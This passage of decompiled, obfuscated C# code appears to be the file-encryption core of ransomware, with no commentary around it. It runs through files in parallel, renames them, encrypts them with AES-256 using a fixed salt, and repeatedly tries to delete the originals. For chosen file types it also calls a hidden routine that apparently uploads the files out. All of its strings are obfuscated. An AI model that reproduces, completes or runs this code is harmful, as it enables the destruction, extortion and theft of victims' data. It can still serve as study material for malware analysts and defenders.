										RWkakVMvZzWyf(item, item + iathxhxZEnZYRxr.getString_0(107389711), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!ikJhDajEXzE)
										{
											KTFeWSRIhASFlx(item, item, wYUomwviRA);
										}
										else
										{
											KTFeWSRIhASFlx(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex23)
									{
										if (fvDSfFEVAaG)
										{
											try
											{
												File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + item + iathxhxZEnZYRxr.getString_0(107389702) + ex23.Message + iathxhxZEnZYRxr.getString_0(107396347));
											}
											catch (Exception)
											{
											}
										}
										bPwGjuPFVSkSv++;
										goto end_IL_02cd_2;
									}
								}
								if (ikJhDajEXzE)
								{
									if (CS_0024_003C_003E8__locals0.oUtDEXanHATFjP != iathxhxZEnZYRxr.getString_0(107389748))
									{
										OUVgqzYMvbARRN(item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, bytes3);
									}
									else
									{
										OUVgqzYMvbARRN(item, bytes3);
									}
								}
								goto IL_094b;
							}
							CS_0024_003C_003E8__locals0 = new iathxhxZEnZYRxr.UVREpotDXBDLSX();
							CS_0024_003C_003E8__locals0.qoIwIxRXeCZoRFmks = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.oUtDEXanHATFjP != iathxhxZEnZYRxr.getString_0(107389748))
								{
									if (mNTCrJeXlKdoL)
									{
										CS_0024_003C_003E8__locals0.oUtDEXanHATFjP = bKhumNWWxHrd + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP);
								}
							}
							catch (Exception ex25)
							{
								if (fvDSfFEVAaG)
								{
									try
									{
										File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + item + iathxhxZEnZYRxr.getString_0(107406644) + ex25.Message + iathxhxZEnZYRxr.getString_0(107396347));
									}
									catch (Exception)
									{
									}
								}
								bPwGjuPFVSkSv++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.IyMOKOotYjsS = iathxhxZEnZYRxr.getString_0(107393475);
							if (CS_0024_003C_003E8__locals0.oUtDEXanHATFjP != iathxhxZEnZYRxr.getString_0(107389748))
							{
								CS_0024_003C_003E8__locals0.IyMOKOotYjsS = item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP;
							}
							else
							{
								CS_0024_003C_003E8__locals0.IyMOKOotYjsS = item;
							}
							if (UgGccBxJROB == iathxhxZEnZYRxr.getString_0(107396817))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in sMhKmHJvtlNZhjZ)
									{
										if (CS_0024_003C_003E8__locals0.IyMOKOotYjsS.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.qoIwIxRXeCZoRFmks.oUtDEXanHATFjP) && nDWwTnbqwmod == iathxhxZEnZYRxr.UVREpotDXBDLSX.getString_0(107396820))
										{
											if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.IyMOKOotYjsS).Length)
											{
												try
												{
													WvzKEuHaCmnRFN.TuLLWzXJhisVm(iathxhxZEnZYRxr.UVREpotDXBDLSX.getString_0(107393559), iathxhxZEnZYRxr.UVREpotDXBDLSX.getString_0(107393522), iathxhxZEnZYRxr.UVREpotDXBDLSX.getString_0(107393541), CS_0024_003C_003E8__locals0.IyMOKOotYjsS);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.IyMOKOotYjsS.ToLower().EndsWith(item2) && nDWwTnbqwmod == iathxhxZEnZYRxr.UVREpotDXBDLSX.getString_0(107397077))
										{
											try
											{
												WvzKEuHaCmnRFN.TuLLWzXJhisVm(iathxhxZEnZYRxr.UVREpotDXBDLSX.getString_0(107393559), iathxhxZEnZYRxr.UVREpotDXBDLSX.getString_0(107393522), iathxhxZEnZYRxr.UVREpotDXBDLSX.getString_0(107393541), CS_0024_003C_003E8__locals0.IyMOKOotYjsS);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = DPogULUxIgM.rxoNTzmfopSMb(32);
							string s4 = qQVKYmLneEhR.HpWrTpHQoP(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							byte[] array2 = null;
							byte[] byte_2 = UcPQEhwbPwt.RfngZyLuPZaRn(CS_0024_003C_003E8__locals0.IyMOKOotYjsS, Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024);
							if (UcPQEhwbPwt.vTfgqKCmDAm(VilQxGdSKPVC: (!lfeuQUnLLY) ? (ikJhDajEXzE ? UcPQEhwbPwt.PeZryOJEgIE(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UcPQEhwbPwt.PeZryOJEgIE(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CmjdIJNPEyJFWZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (ikJhDajEXzE ? xbGQBBqWkqFa.VdtXEqVzDruYfP(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xbGQBBqWkqFa.VdtXEqVzDruYfP(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CmjdIJNPEyJFWZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), GnufvwgpIEeUa: CS_0024_003C_003E8__locals0.IyMOKOotYjsS, BbSyJXSIaCTuyKp: bytes4))
							{
								goto IL_094b;
							}
							try
							{
								File.Move(item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, item);
							}
							catch (Exception)
							{
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_094b;
						}
					}
					continue;
					IL_094b:
					CS_0024_003C_003E8__locals0.maqAcdxAuaVA.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.maqAcdxAuaVA, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new iathxhxZEnZYRxr.VfXuPHCMuymp();
			CS_0024_003C_003E8__locals0.qoIwIxRXeCZoRFmks = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt = string_0;
			if (CS_0024_003C_003E8__locals0.lfllMCihWCs.Length != 0)
			{
				string[] lfllMCihWCs = CS_0024_003C_003E8__locals0.lfllMCihWCs;
				int num = 0;
				while (num < lfllMCihWCs.Length)
				{
					string value = lfllMCihWCs[num];
					if (!CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a13;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt.EndsWith(CS_0024_003C_003E8__locals0.oUtDEXanHATFjP))
				{
					goto IL_0a13;
				}
			}
			catch (Exception)
			{
				goto IL_0a13;
			}
			if (!dfsgzoHLEAZnW.Contains(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt))
			{
				if (iFejgjdImWjFLfEJ == iathxhxZEnZYRxr.getString_0(107396817))
				{
					try
					{
						if (JHjCFdacWDCwN.kXAYfEbwZpl(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt))
						{
							JHjCFdacWDCwN.uJhjcXrkFlLBC(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
						}
					}
					catch
					{
					}
				}
				dfsgzoHLEAZnW.Add(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
				if (!wwtCrdNFpS.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt)))
				{
					wwtCrdNFpS.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt));
				}
				RWmueCtbpjJAa(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
				try
				{
					new iyWSnjnabYn().XvqXWKXAtrbuzV(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (DolWpTQIcvjTgATJ)
							{
								Console.WriteLine(iathxhxZEnZYRxr.getString_0(107407033) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107407468) + new FileInfo(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt).Length + iathxhxZEnZYRxr.getString_0(107407479));
								Console.WriteLine(iathxhxZEnZYRxr.getString_0(107407438));
							}
						}
						catch
						{
						}
						EYyCcfVgmmBPY(QqgSuZNWThrmn(iathxhxZEnZYRxr.getString_0(107407333)), iathxhxZEnZYRxr.getString_0(107392466) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107392466) + QqgSuZNWThrmn(iathxhxZEnZYRxr.getString_0(107407308)) + iathxhxZEnZYRxr.getString_0(107392466) + Environment.UserName + iathxhxZEnZYRxr.getString_0(107392466) + QqgSuZNWThrmn(iathxhxZEnZYRxr.getString_0(107407323)));
					}
				}
				catch (Exception ex2)
				{
					if (fvDSfFEVAaG)
					{
						try
						{
							File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107407298) + ex2.Message + iathxhxZEnZYRxr.getString_0(107396347));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (fvDSfFEVAaG)
						{
							try
							{
								File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107406673) + ex4.Message + iathxhxZEnZYRxr.getString_0(107396347));
							}
							catch (Exception)
							{
							}
						}
						bPwGjuPFVSkSv++;
						goto end_IL_031d_2;
					}
					if (TNpgrHCAoXmhjxRU == iathxhxZEnZYRxr.getString_0(107396817) && new FileInfo(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt).Length > Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.oUtDEXanHATFjP != iathxhxZEnZYRxr.getString_0(107389748))
							{
								if (mNTCrJeXlKdoL)
								{
									CS_0024_003C_003E8__locals0.oUtDEXanHATFjP = bKhumNWWxHrd + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP;
								}
								File.Move(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP);
							}
						}
						catch (Exception ex6)
						{
							if (fvDSfFEVAaG)
							{
								try
								{
									File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107406644) + ex6.Message + iathxhxZEnZYRxr.getString_0(107396347));
								}
								catch (Exception)
								{
								}
							}
							bPwGjuPFVSkSv++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.oUtDEXanHATFjP != iathxhxZEnZYRxr.getString_0(107389748))
						{
							CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt += CS_0024_003C_003E8__locals0.oUtDEXanHATFjP;
						}
						if (UgGccBxJROB == iathxhxZEnZYRxr.getString_0(107396817))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in sMhKmHJvtlNZhjZ)
								{
									if (CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.qoIwIxRXeCZoRFmks.oUtDEXanHATFjP) && nDWwTnbqwmod == iathxhxZEnZYRxr.VfXuPHCMuymp.getString_0(107396823))
									{
										if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt).Length)
										{
											try
											{
												WvzKEuHaCmnRFN.TuLLWzXJhisVm(iathxhxZEnZYRxr.VfXuPHCMuymp.getString_0(107393562), iathxhxZEnZYRxr.VfXuPHCMuymp.getString_0(107393525), iathxhxZEnZYRxr.VfXuPHCMuymp.getString_0(107393544), CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt.ToLower().EndsWith(item3) && nDWwTnbqwmod == iathxhxZEnZYRxr.VfXuPHCMuymp.getString_0(107397080))
									{
										try
										{
											WvzKEuHaCmnRFN.TuLLWzXJhisVm(iathxhxZEnZYRxr.VfXuPHCMuymp.getString_0(107393562), iathxhxZEnZYRxr.VfXuPHCMuymp.getString_0(107393525), iathxhxZEnZYRxr.VfXuPHCMuymp.getString_0(107393544), CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = DPogULUxIgM.rxoNTzmfopSMb(32);
						string s = qQVKYmLneEhR.HpWrTpHQoP(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = UcPQEhwbPwt.RfngZyLuPZaRn(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024);
						if (!UcPQEhwbPwt.vTfgqKCmDAm(VilQxGdSKPVC: (!lfeuQUnLLY) ? (ikJhDajEXzE ? UcPQEhwbPwt.PeZryOJEgIE(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UcPQEhwbPwt.PeZryOJEgIE(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CmjdIJNPEyJFWZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (ikJhDajEXzE ? xbGQBBqWkqFa.VdtXEqVzDruYfP(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xbGQBBqWkqFa.VdtXEqVzDruYfP(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CmjdIJNPEyJFWZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), GnufvwgpIEeUa: CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, BbSyJXSIaCTuyKp: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (mNTCrJeXlKdoL)
						{
							CS_0024_003C_003E8__locals0.oUtDEXanHATFjP = bKhumNWWxHrd + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP;
						}
						string text2 = DPogULUxIgM.rxoNTzmfopSMb(32);
						string s2 = qQVKYmLneEhR.HpWrTpHQoP(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.oUtDEXanHATFjP != iathxhxZEnZYRxr.getString_0(107389748))
						{
							if (!XSErQnXGRX)
							{
								if (!ikJhDajEXzE)
								{
									RWkakVMvZzWyf(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, wYUomwviRA);
								}
								else
								{
									RWkakVMvZzWyf(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!ikJhDajEXzE)
									{
										KTFeWSRIhASFlx(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, wYUomwviRA);
									}
									else
									{
										KTFeWSRIhASFlx(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (fvDSfFEVAaG)
									{
										try
										{
											File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107389702) + ex9.Message + iathxhxZEnZYRxr.getString_0(107396347));
										}
										catch (Exception)
										{
										}
									}
									bPwGjuPFVSkSv++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!XSErQnXGRX)
						{
							if (!ikJhDajEXzE)
							{
								RWkakVMvZzWyf(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107389711), wYUomwviRA);
							}
							else
							{
								RWkakVMvZzWyf(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107389711), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!ikJhDajEXzE)
								{
									KTFeWSRIhASFlx(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, wYUomwviRA);
								}
								else
								{
									KTFeWSRIhASFlx(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (fvDSfFEVAaG)
								{
									try
									{
										File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + iathxhxZEnZYRxr.getString_0(107389702) + ex12.Message + iathxhxZEnZYRxr.getString_0(107396347));
									}
									catch (Exception)
									{
									}
								}
								bPwGjuPFVSkSv++;
								return;
							}
						}
						if (ikJhDajEXzE)
						{
							if (CS_0024_003C_003E8__locals0.oUtDEXanHATFjP != iathxhxZEnZYRxr.getString_0(107389748))
							{
								OUVgqzYMvbARRN(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, bytes2);
							}
							else
							{
								OUVgqzYMvbARRN(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a13;
			IL_0a13:
			CS_0024_003C_003E8__locals0.maqAcdxAuaVA.Remove(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
		});
	}

	private static void QXLBzxsVHzs(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (UgGccBxJROB == getString_0(107396798))
					{
						foreach (string item in sMhKmHJvtlNZhjZ)
						{
							if (string_0.ToLower().EndsWith(item) && nDWwTnbqwmod == getString_0(107396798))
							{
								if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393537), getString_0(107393500), getString_0(107393519), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && nDWwTnbqwmod == getString_0(107397055))
							{
								try
								{
									WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393537), getString_0(107393500), getString_0(107393519), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389692)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389692), getString_0(107393456)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void KTFeWSRIhASFlx(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (UgGccBxJROB == getString_0(107396798))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in sMhKmHJvtlNZhjZ)
				{
					if (string_0.ToLower().EndsWith(item) && nDWwTnbqwmod == getString_0(107396798))
					{
						if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393537), getString_0(107393500), getString_0(107393519), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && nDWwTnbqwmod == getString_0(107397055))
					{
						try
						{
							WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393537), getString_0(107393500), getString_0(107393519), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = xbGQBBqWkqFa.VdtXEqVzDruYfP(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		DcpSoxMogYW++;
	}

	private static void RWkakVMvZzWyf(string string_0, string string_1, byte[] byte_0)
	{
		UGClOMhQSmdPCphv CS_0024_003C_003E8__locals0 = new UGClOMhQSmdPCphv();
		CS_0024_003C_003E8__locals0.bQDxaczCcCV = string_0;
		CS_0024_003C_003E8__locals0.mrBqfZqsDLsHM = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string mrBqfZqsDLsHM = CS_0024_003C_003E8__locals0.mrBqfZqsDLsHM;
			FileStream fileStream = new FileStream(mrBqfZqsDLsHM, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (SphVOVZCYpOX == getString_0(107396798))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.bQDxaczCcCV, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.bQDxaczCcCV, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.bQDxaczCcCV, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.mrBqfZqsDLsHM.Length > 0)
				{
					if (UgGccBxJROB == getString_0(107396798))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.bQDxaczCcCV, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in sMhKmHJvtlNZhjZ)
						{
							if (CS_0024_003C_003E8__locals0.bQDxaczCcCV.ToLower().EndsWith(item) && nDWwTnbqwmod == getString_0(107396798))
							{
								if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393537), getString_0(107393500), getString_0(107393519), CS_0024_003C_003E8__locals0.bQDxaczCcCV);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.bQDxaczCcCV.ToLower().EndsWith(item) && nDWwTnbqwmod == getString_0(107397055))
							{
								try
								{
									WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393537), getString_0(107393500), getString_0(107393519), CS_0024_003C_003E8__locals0.bQDxaczCcCV);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.bQDxaczCcCV);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.mrBqfZqsDLsHM.EndsWith(getString_0(107389692)))
					{
						File.Move(CS_0024_003C_003E8__locals0.mrBqfZqsDLsHM, CS_0024_003C_003E8__locals0.mrBqfZqsDLsHM.Replace(getString_0(107389692), getString_0(107393456)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.mrBqfZqsDLsHM))
							{
								File.Delete(CS_0024_003C_003E8__locals0.mrBqfZqsDLsHM);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (fvDSfFEVAaG)
			{
				try
				{
					File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390461) + CS_0024_003C_003E8__locals0.bQDxaczCcCV + getString_0(107389683) + ex2.Message + getString_0(107396328));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> bEddlMgSRumsUTrFf = BEddlMgSRumsUTrFf;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107389630)), string_0);
			};
		}
		Parallel.ForEach(bEddlMgSRumsUTrFf, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> bZJTxwHhEd = BZJTxwHhEd;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
